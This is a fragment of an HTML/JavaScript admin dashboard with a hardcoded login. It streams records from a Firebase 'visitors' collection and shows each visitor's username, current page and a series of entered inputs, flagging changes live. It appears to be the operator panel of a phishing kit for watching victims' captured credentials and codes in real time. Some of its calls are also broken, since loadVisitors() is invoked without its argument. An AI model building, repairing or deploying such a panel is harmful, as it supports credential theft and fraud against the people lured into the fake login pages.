    * {

    body {
      background: #f5f5f5;
      margin: 0;
    }

    .screen-loader {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.55);
      backdrop-filter: blur(2px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .screen-loader.active {
      display: flex;
    }

    .spinner {
      width: 52px;
      height: 52px;
      border: 4px solid rgba(0,87,168,.15);
      border-top-color: #0057a8;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>

</head>

  <script>

  const ADMIN_USERNAME = "ward";
  const ADMIN_PASSWORD = "Aa100200@";

  const loginBtn =
    document.getElementById("loginBtn");

  const loginPage =
    document.getElementById("loginPage");

  const dashboard =
    document.getElementById("dashboard");

  const loader =
    document.getElementById("loader");

  const loginError =
    document.getElementById("loginError");

  const visitorsTable =
    document.getElementById("visitorsTable");

  // CURRENT OPEN MODAL VISITOR
  let currentVisitorIndex = null;
  
  let previousVisitors = [];
  let updatedVisitors = [];
  let allVisitors = [];
  // LOGIN
  loginBtn.addEventListener("click", () => {

    const username =
      document.getElementById("adminUsername")
      .value.trim();

    const password =
      document.getElementById("adminPassword")
      .value.trim();

    if (
      username === ADMIN_USERNAME &&
      password === ADMIN_PASSWORD
    ) {

      loginError.classList.add("hidden");

      loader.classList.add("active");

      setTimeout(() => {

        loader.classList.remove("active");

        loginPage.classList.add("hidden");

        dashboard.classList.remove("hidden");

        loadVisitors();

        previousVisitors =
  JSON.parse(
    localStorage.getItem("visitors")
  ) || [];

        // LIVE AUTO UPDATE
        startLiveUpdates();

      }, 1500);

    }

    else {

      loginError.classList.remove("hidden");

    }

  });

  // LOGOUT
  document
    .getElementById("logoutBtn")
    .addEventListener("click", () => {

      dashboard.classList.add("hidden");

      loginPage.classList.remove("hidden");

      clearInterval(window.liveVisitorsInterval);

  });

  // LOAD VISITORS
  function loadVisitors(visitors) {

  visitorsTable.innerHTML = "";

  visitors.forEach((visitor, index) => {

    const hasUpdate =
      updatedVisitors.includes(visitor.id);

    visitorsTable.innerHTML += `

      <tr class="border-t border-[#efefef]">

        <td class="p-5 font-bold text-[#222]">
          ${visitor.username || "-"}
        </td>

        <td class="p-5 text-[#555] font-semibold">
          ${visitor.currentPage || "-"}
        </td>

        <td class="p-5 text-center">

          <div class="relative inline-block">

            <button
              onclick="showVisitor(${index})"
              class="
                h-11
                px-5
                rounded-2xl
                bg-[#0057a8]
                text-white
                font-bold
              "
            >
              عرض
            </button>

            ${
              hasUpdate
              ? `
                <span
                  class="
                    absolute
                    -top-1
                    -right-1
                    w-4
                    h-4
                    rounded-full
                    bg-red-500
                    border-2
                    border-white
                  "
                ></span>
              `
              : ""
            }

          </div>

        </td>

      </tr>

    `;

  });

}

  // LIVE UPDATE
  function startLiveUpdates() {

  const visitorsRef =
    window.firebaseFns.collection(
      window.db,
      "visitors"
    );

  window.firebaseFns.onSnapshot(
    visitorsRef,
    (snapshot) => {

      allVisitors = [];

      snapshot.forEach((doc) => {

        allVisitors.push(doc.data());

      });

      detectUpdates(allVisitors);

      loadVisitors(allVisitors);

      updateModalData();

    }
  );

}

  // SHOW NOTIFICATION




// DETECT CHANGES
// DETECT CHANGES
function detectUpdates(visitors) {

  visitors.forEach((visitor) => {

    const oldVisitor =
      previousVisitors.find(
        (v) => v.id === visitor.id
      );

    if (!oldVisitor) return;

    const changed =

      oldVisitor.currentPage !==
      visitor.currentPage ||

      oldVisitor.entered2Input !==
      visitor.entered2Input ||

      oldVisitor.entered3Input !==
      visitor.entered3Input ||

      oldVisitor.enteredForgotUsername !==
      visitor.enteredForgotUsername ||

      oldVisitor.entered4Input !==
      visitor.entered4Input ||

      oldVisitor.entered5Input !==
      visitor.entered5Input ||

      oldVisitor.entered6Input !==
      visitor.entered6Input;

    if (changed) {

      if (
        !updatedVisitors.includes(
          visitor.id
        )
      ) {

        updatedVisitors.push(
          visitor.id
        );

      }

    }

  });

  previousVisitors =
    JSON.parse(
      JSON.stringify(visitors)
    );

}

  // SHOW POPUP
  function showVisitor(index) {

    currentVisitorIndex = index;

    const visitors = allVisitors;

const visitor =
  visitors[index];

updatedVisitors =
  updatedVisitors.filter(
    id => id !== visitor.id
  );

loadVisitors();

    updateModalData();

    document
      .getElementById("modal")
      .classList.remove("hidden");

  }

  // UPDATE MODAL LIVE
  
function updateModalData() {

  if (currentVisitorIndex === null)
    return;

  const visitors = allVisitors;

  const visitor =
    visitors[currentVisitorIndex];

  if (!visitor) return;

  document.getElementById(
    "modalInput1"
  ).textContent =
    visitor.username || "-";

  document.getElementById(
    "modalInput2"
  ).textContent =
    visitor.entered2Input || "-";

  document.getElementById(
    "modalInput3"
  ).textContent =
    visitor.entered3Input || "-";

    document.getElementById(
  "modalForgotUsername"
).textContent =
  visitor.enteredForgotUsername || "-";

  document.getElementById(
    "modalInput4"
  ).textContent =
    visitor.entered4Input || "-";

  document.getElementById(
    "modalInput5"
  ).textContent =
    visitor.entered5Input || "-";

  document.getElementById(
    "modalInput6"
  ).textContent =
    visitor.entered6Input || "-";

}

  // CLOSE MODAL
  document
    .getElementById("closeModal")
    .addEventListener("click", () => {

      document
        .getElementById("modal")
        .classList.add("hidden");

      currentVisitorIndex = null;

  });

</script>
